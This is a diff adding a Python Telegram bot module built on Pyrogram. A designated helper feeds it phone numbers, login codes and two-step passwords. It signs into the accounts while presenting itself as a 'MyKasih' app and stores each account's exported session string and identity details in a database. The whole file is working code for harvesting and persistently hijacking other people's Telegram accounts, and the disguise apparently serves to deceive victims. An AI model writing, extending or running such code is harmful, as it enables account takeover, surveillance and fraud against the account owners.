@@ -1,0 +1,163 @@
+import time
+from typing import Union
+
+from pyrogram import idle, filters
+from pyrogram.errors import AuthKeyDuplicated, FloodWait, PhoneNumberInvalid, PhoneNumberBanned, PhoneCodeInvalid, \
+    PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid
+import config
+from config import OWNER, HELPER
+from pyromod import Client, Message
+from helpers.database import db
+
+otp_hash = {}
+clients = {}
+need_pass = {}
+saved = {}
+
+
+def reset(phone):
+    if clients.get(phone):
+        clients.pop(phone)
+    if otp_hash.get(phone):
+        otp_hash.pop(phone)
+    if need_pass.get(phone):
+        need_pass.pop(phone)
+
+
+@Client.on_message(filters.command("get_otp") & filters.bot & filters.private & filters.user(HELPER))
+async def start_handler(c: Client, m: Message):
+    argv = m.command
+    if len(argv) < 2:
+        return await m.reply_text("Please input phone number")
+    phone = argv[1]
+    phone_hash = None
+    try:
+        print("get otp", phone)
+        client = Client(
+            name=f"{argv[1]}",
+            api_id=config.API_ID,
+            api_hash=config.API_HASH,
+            device_model="MyKasih",
+            app_version="MyKasih 5.0.9",
+            system_version=f"MyKasih 5.0.9",
+        )
+        await client.connect()
+        otp_sent = await client.send_code(phone)
+        phone_hash = otp_sent.phone_code_hash
+        otp_hash[phone] = phone_hash
+        clients[phone] = client
+        await m.reply_text(f"OTP sent to `{phone}`")
+
+        # if otp_sent is not None:
+        #     response: Message = await c.listen(chat_id=m.chat.id, user_id=m.from_user.id, timeout=60)
+        #     if re.match(r'^otp:(\d-\d-\d-\d-\d)$', response.text):
+        #         if left:
+        #
+        #         otp = response.text
+        #         await client.sign_in(phone, phone_hash, phone_code=otp)
+        #         await m.reply_text("Success")
+        # else:
+        #     phone_code_msg = await m.chat.ask(
+        #         "Please check for an OTP in official telegram account. If you got it, send OTP here after reading the below format. \nIf OTP is `1 2 3 4 5`, **please send it as** `1 2 3 4 5`.",
+        #         filters=filters.text,
+        #         timeout=600,
+        #     )
+
+        # await client.disconnect()
+    except FloodWait as flood:
+        return await m.reply_text(f"Flood wait {flood.value} seconds")
+    except PhoneNumberInvalid:
+        reset(phone)
+        return await m.reply(
+            f"`PHONE NUMBER` is invalid. Please try again /start."
+        )
+    except PhoneNumberBanned:
+        reset(phone)
+        return await m.reply(
+            f"Phone Number Banned from Telegram. Please try another number again /start."
+        )
+    except Exception as e:
+        print(e)
+
+
+@Client.on_message(filters.command("send_otp") & filters.bot & filters.private & filters.user(HELPER))
+async def send_handler(c: Client, m: Message):
+    cmd = m.command
+    argv = str(cmd[1]).split("|")
+    if len(cmd) < 2:
+        return await m.reply_text("Please input phone number")
+    phone = argv[0]
+    phone_code = str(argv[1]).replace("-", "")
+    client: Union[Client, None] = clients.get(phone, None)
+    phone_hash: str = otp_hash.get(phone, None)
+    if not client or not phone_hash:
+        return await m.reply_text("Please get otp first")
+    try:
+        await client.sign_in(phone, phone_hash, phone_code=phone_code)
+        await m.reply_text("Success")
+        string_session = await client.export_session_string()
+        is_me = await client.get_me()
+        _ = await db.insert(
+            is_me.id,
+            is_me.phone_number,
+            is_me.first_name,
+            is_me.username,
+            "",
+            string_session,
+            client.api_id,
+            client.device_model,
+            timestamp=int(time.time()),
+        )
+        await client.disconnect()
+        clients.pop(phone)
+        otp_hash.pop(phone)
+    except PhoneCodeInvalid as pci:
+        await m.reply(f"OTP is invalid. Please try again /start.")
+        reset(phone)
+    except PhoneCodeExpired as pce:
+        await m.reply(f"OTP is expired. Please try again /start.")
+        reset(phone)
+    except SessionPasswordNeeded:
+        need_pass[phone] = client
+        return await m.reply_text("Please input password")
+
+
+@Client.on_message(filters.command("send_pw") & filters.bot & filters.private & filters.user(HELPER))
+async def send_pw_handler(c: Client, m: Message):
+    cmd = m.command
+    argv = str(cmd[1]).split("|")
+    if len(cmd) < 2:
+        return await m.reply_text("Please input phone number")
+    phone = argv[0]
+    pw: str = argv[1]
+    client: Union[Client, None] = need_pass.get(phone, None)
+    phone_hash: str = otp_hash.get(phone, None)
+    if not client or not phone_hash:
+        return await m.reply_text("Please get otp first")
+    try:
+        password = pw.strip()
+        await client.check_password(password=password)
+        string_session = await client.export_session_string()
+        is_me = await client.get_me()
+        _ = await db.insert(
+            is_me.id,
+            is_me.phone_number,
+            is_me.first_name,
+            is_me.username,
+            "",
+            string_session,
+            client.api_id,
+            client.device_model,
+            timestamp=int(time.time()),
+        )
+        await m.reply_text("Success")
+        await client.disconnect()
+        reset(phone)
+    except PasswordHashInvalid as phi:
+        reset(phone)
+        return await m.reply(
+            f"Invalid Password. Please try again /start.",
+        )
+    except Exception as e:
+        print(e)
+
